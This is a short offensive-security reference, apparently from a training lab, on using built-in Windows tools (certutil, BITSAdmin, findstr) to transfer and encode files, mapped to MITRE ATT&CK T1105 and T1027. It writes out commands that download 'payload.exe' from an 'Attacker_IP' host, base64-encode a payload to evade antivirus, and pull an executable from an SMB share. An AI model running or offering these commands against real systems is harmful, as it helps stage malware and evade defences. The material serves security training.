# File operations

## Certutil

Certutil is a preinstalled tool on Windows OS that can be used to download malicious files and evade Antivirus.

Certutil is a CLI tool to dump and display certificate authority (CA), configuration information, configures 
Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains. 
It is installed as a part of Certificate Services. It can also be used to transfer and encode files unrelated to 
certification services. The MITRE ATT&CK framework refers to the first as Ingress tool transfer 
([T1105](https://attack.mitre.org/techniques/T1105/)), and the second as [T1027](https://attack.mitre.org/techniques/T1027/).

To download a file from an attacker's web server and store it in the Window's temporary folder:

    certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe

* `-urlcache` to display URL, enables the URL option to use in the command.
* `-split -f` to split and force fetching files from the provided URL.

To encode a payload:

    certutil -encode payload.exe Encoded-payload.txt
    certutil -decode Encoded-payload.txt payload.exe

## BITSAdmin

BITSAdmin is a tool preinstalled on Windows OS that can be used to download malicious files.

Background Intelligent Transfer Service Admin is a command-line tool that creates downloads or uploads jobs and monitors 
their progress. When BITS downloads a file, the actual download is done behind the svchost.exe service. BITSAdmin can 
be used to download files from or upload files to HTTP web servers and SMB file shares. It takes the cost of the 
transfer into account, as well as the network usage so that the user’s foreground work is not influenced. BITS has 
the ability to handle network interruptions, pausing and automatically resuming transfers, even after a reboot.

To download using /transfer Switch:

    bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe

* `/Transfer`, to use the transfer option.
* `/Download`, specifying transfer using download type.
* `/Priority`, of the job to be running in the foreground.

## Findstr

Findstr is a tool pre-installed on Windows that can be used to find text and string patterns in files.

It can also be used to download remote files from SMB shared folders within the network.

    findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

* `/V` to print out the lines that do not contain the string provided.
* `dummystring` the text to be searched for; in this case, we provide a string that must not be found in a file.
* `> c:\Windows\Temp\test.exe` redirect the output to a file on the target machine.

## Resources

* [Microsoft Docs: certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
* [Microsoft Docs: bitsadmin](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin)
* [Microsoft Docs: findstr](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)

